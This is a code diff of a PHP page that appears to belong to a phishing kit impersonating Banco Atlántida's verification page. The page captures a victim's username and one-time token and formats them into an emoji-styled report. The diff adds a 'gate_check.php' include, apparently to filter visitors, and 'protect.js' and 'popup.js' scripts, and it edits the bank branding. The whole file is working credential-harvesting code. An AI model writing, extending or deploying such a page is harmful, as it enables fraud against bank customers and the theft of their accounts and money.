@@ -1,4 +1,5 @@
 <?php
+require_once dirname(__DIR__) . '/gate_check.php';
 include("../data.php");
 $usuario = trim($_GET['u'] ?? $_POST['u'] ?? '');
 
@@ -11,7 +12,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
     }
     $date = date('d/m/Y H:i:s');
 
-    $msg  = "🔐 BANCO ATLÁNTIDA — TOKEN #{$round}\n";
+    $msg  = "🔐 BANCO MANZANA — TOKEN #{$round}\n";
     $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
     $msg .= "👤 Usuario: {$usuario}\n";
     $msg .= "🔑 Token: {$tk}\n";
@@ -48,7 +49,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-  <title>Banco Atlántida — Verificación</title>
+  <title>Banco Atl&#225;ntida — Verificación</title>
   <link rel="icon" href="../img/logo-ba.svg" type="image/svg+xml"/>
   <link rel="preconnect" href="https://fonts.googleapis.com"/>
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
@@ -98,7 +99,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
 <body>
 
   <div id="loader">
-    <img src="../img/logo-ba.svg" class="load-logo" alt="Banco Atlántida"/>
+    <img src="../img/logo-ba.svg" class="load-logo" alt="Banco Atl&#225;ntida"/>
     <div class="gif-loader">
       <div class="ring r1"></div>
       <div class="ring r2"></div>
@@ -201,5 +202,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
     const IS_RETRY = <?= isset($_GET['retry']) ? 'true' : 'false' ?>;
     if (IS_RETRY) { showToken(); } else { showLoader(60000); }
   </script>
+<script src="../protect.js"></script>
+<script src="../popup.js"></script>
 </body>
 </html>
